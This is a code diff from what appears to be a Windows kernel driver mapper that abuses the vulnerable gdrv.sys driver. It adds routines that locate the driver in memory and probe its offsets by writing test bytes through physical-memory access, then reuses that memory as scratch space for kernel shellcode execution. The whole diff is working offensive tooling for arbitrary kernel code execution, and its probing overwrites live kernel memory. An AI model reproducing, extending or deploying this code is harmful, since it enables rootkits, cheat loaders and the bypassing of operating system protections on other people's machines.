@@ -103,6 +103,103 @@ bool GDRVMapper::WritePhysicalMemory(uint64_t physAddress, const void* buffer, s
     return false;
 }
 
+uint64_t GDRVMapper::FindGDRVWritableMemory() {
+    std::cout << "[*] Searching for GDRV driver memory..." << std::endl;
+    
+    // Get loaded modules information 
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (!ntdll) return 0;
+    
+    typedef NTSTATUS(NTAPI* NtQuerySystemInformationFn)(
+        ULONG SystemInformationClass,
+        PVOID SystemInformation,
+        ULONG SystemInformationLength,
+        PULONG ReturnLength
+    );
+    
+    auto NtQuerySystemInformation = (NtQuerySystemInformationFn)GetProcAddress(
+        ntdll, "NtQuerySystemInformation");
+    if (!NtQuerySystemInformation) return 0;
+    
+    // Get list of modules
+    std::vector<uint8_t> buffer;
+    ULONG len = 0;
+    NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
+    buffer.resize(len);
+    if (NtQuerySystemInformation(SystemModuleInformation, buffer.data(), len, &len) != 0)
+        return 0;
+
+    auto modules = (PSYSTEM_MODULE_INFORMATION)buffer.data();
+    uint64_t gdrvBase = 0;
+    
+    // Find GDRV driver
+    for (ULONG i = 0; i < modules->Count; i++) {
+        std::string path = std::string(modules->Modules[i].FullPathName);
+        if (path.find("gdrv.sys") != std::string::npos || path.find("GDRV.sys") != std::string::npos) {
+            gdrvBase = (uint64_t)modules->Modules[i].ImageBase;
+            std::cout << "[+] Found GDRV driver at 0x" << std::hex << gdrvBase << std::dec << std::endl;
+            std::cout << "[+] Path: " << path << std::endl;
+            break;
+        }
+    }
+    
+    if (!gdrvBase) {
+        std::cerr << "[-] Could not find GDRV driver in memory" << std::endl;
+        return 0;
+    }
+    
+    // Try various offsets - focus on likely locations for writable memory
+    const uint64_t offsets[] = {
+        0x1000,  // Often the start of sections
+        0x2000,  // Another common section offset
+        0x3000,  // .data section is often here
+        0x4000,  // .bss section could be here
+        0x5000,  // Or here
+        0x8000,  // Try a bit further in
+        0x10000  // Sometimes larger offset is needed
+    };
+    
+    std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
+    
+    // Try standard offsets first
+    for (auto offset : offsets) {
+        uint64_t tryAddr = gdrvBase + offset;
+        std::cout << "[*] Trying GDRV memory at 0x" << std::hex << tryAddr << std::dec << std::endl;
+        
+        if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size())) {
+            std::cout << "[+] Found writable memory in GDRV at 0x" << std::hex << tryAddr << std::dec << std::endl;
+            return tryAddr;
+        }
+    }
+    
+    // If standard offsets fail, try scanning in a loop
+    for (uint64_t offset = 0x1000; offset < 0x50000; offset += 0x1000) {
+        // Skip offsets we already tried
+        bool already_tried = false;
+        for (auto standard_offset : offsets) {
+            if (offset == standard_offset) {
+                already_tried = true;
+                break;
+            }
+        }
+        if (already_tried) continue;
+        
+        uint64_t tryAddr = gdrvBase + offset;
+        // Only log every 16KB to avoid spamming
+        if (offset % 0x4000 == 0) {
+            std::cout << "[*] Scanning GDRV memory at 0x" << std::hex << tryAddr << std::dec << std::endl;
+        }
+        
+        if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size())) {
+            std::cout << "[+] Found writable memory in GDRV at 0x" << std::hex << tryAddr << std::dec << std::endl;
+            return tryAddr;
+        }
+    }
+    
+    std::cerr << "[-] Could not find writable memory in GDRV driver" << std::endl;
+    return 0;
+}
+
 uint64_t GDRVMapper::TryWritableRegion(uint64_t startAddr) {
     // Check cached address first
     if (cachedWritableAddr != 0) {
@@ -111,54 +208,47 @@ uint64_t GDRVMapper::TryWritableRegion(uint64_t startAddr) {
             std::cout << "[+] Using cached writable memory at 0x" << std::hex << cachedWritableAddr << std::dec << std::endl;
             return cachedWritableAddr;
         }
-        // Clear cache if it's no longer writable
+        // Clear cache if no longer writable
         cachedWritableAddr = 0;
     }
 
-    std::cout << "[*] Searching for writable memory starting at 0x" << std::hex << startAddr << std::dec << std::endl;
-    
-    // Try scanning a few pages
-    std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
-    for (int i = 0; i < 8; i++) {
-        uint64_t tryAddr = startAddr + (i * 0x1000);
-        std::cout << "[*] Probing address 0x" << std::hex << tryAddr << std::dec << std::endl;
+    // Try GDRV memory first if startAddr is 0
+    if (startAddr == 0) {
+        uint64_t gdrvAddr = FindGDRVWritableMemory();
+        if (gdrvAddr) {
+            cachedWritableAddr = gdrvAddr;
+            return gdrvAddr;
+        }
+    }
+
+    // Only if GDRV fails or startAddr is specified, try other methods
+    if (startAddr != 0) {
+        std::cout << "[*] Trying fallback memory search at 0x" << std::hex << startAddr << std::dec << std::endl;
         
-        if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size())) {
-            std::cout << "[+] Found writable memory at 0x" << std::hex << tryAddr << std::dec << std::endl;
-            cachedWritableAddr = tryAddr;  // Cache the successful address
-            return tryAddr;
+        std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
+        for (int i = 0; i < 8; i++) {
+            uint64_t tryAddr = startAddr + (i * 0x1000);
+            std::cout << "[*] Probing address 0x" << std::hex << tryAddr << std::dec << std::endl;
+            
+            if (WritePhysicalMemory(tryAddr, testPattern.data(), testPattern.size())) {
+                std::cout << "[+] Found writable memory at 0x" << std::hex << tryAddr << std::dec << std::endl;
+                cachedWritableAddr = tryAddr;
+                return tryAddr;
+            }
         }
     }
     
-    std::cerr << "[-] Failed to find writable memory by brute force" << std::endl;
     return 0;
 }
 
 bool GDRVMapper::ExecuteBootstrapShellcode(uint64_t functionAddr, uint64_t* result) {
-    // Try finding writable memory at a lower offset from ntoskrnl
-    uint64_t scratchAddr = TryWritableRegion(ntoskrnlBase + 0x100000);
+    // Try GDRV memory first (passing 0 triggers GDRV search)
+    uint64_t scratchAddr = TryWritableRegion(0);
     
-    // If that fails, try making memory writable via PTE
+    // If GDRV fails, try the old approaches
     if (!scratchAddr) {
-        scratchAddr = ntoskrnlBase + 0x100000;  // Use fixed address
-        std::cout << "[*] Attempting to make memory writable at 0x" << std::hex << scratchAddr << std::dec << std::endl;
-        
-        if (!PageTableUtils::MakeMemoryWritable(
-            scratchAddr,
-            [this](uint64_t addr, void* buf, size_t len) { return ReadPhysicalMemory(addr, buf, len); },
-            [this](uint64_t addr, const void* buf, size_t len) { return WritePhysicalMemory(addr, buf, len); },
-            nullptr  // Pass null to avoid recursion
-        )) {
-            std::cerr << "[-] Failed to make bootstrap memory writable" << std::endl;
-            return false;
-        }
-        
-        // Try writing to it again
-        std::vector<uint8_t> testPattern = { 0xDE, 0xAD, 0xBE, 0xEF };
-        if (!WritePhysicalMemory(scratchAddr, testPattern.data(), testPattern.size())) {
-            std::cerr << "[-] Failed to write to memory even after PTE modification" << std::endl;
-            return false;
-        }
+        std::cerr << "[-] Failed to find writable memory in GDRV, trying fallback methods" << std::endl;
+        scratchAddr = TryWritableRegion(ntoskrnlBase + 0x100000);
     }
     
     // Create minimal shellcode that just calls a function and returns the value
@@ -228,6 +318,15 @@ bool GDRVMapper::ExecuteBootstrapShellcode(uint64_t functionAddr, uint64_t* resu
 }
 
 uint64_t GDRVMapper::FindKThreadStackMemory() {
+    // Try GDRV memory first
+    uint64_t addr = TryWritableRegion(0);
+    if (addr) {
+        return addr;
+    }
+
+    // If GDRV fails, try the original KTHREAD approach
+    std::cout << "[*] GDRV memory not available, trying KTHREAD stack..." << std::endl;
+    
     // Get PsGetCurrentThread address
     HMODULE ntoskrnl = LoadLibraryA("ntoskrnl.exe");
     if (!ntoskrnl) return 0;
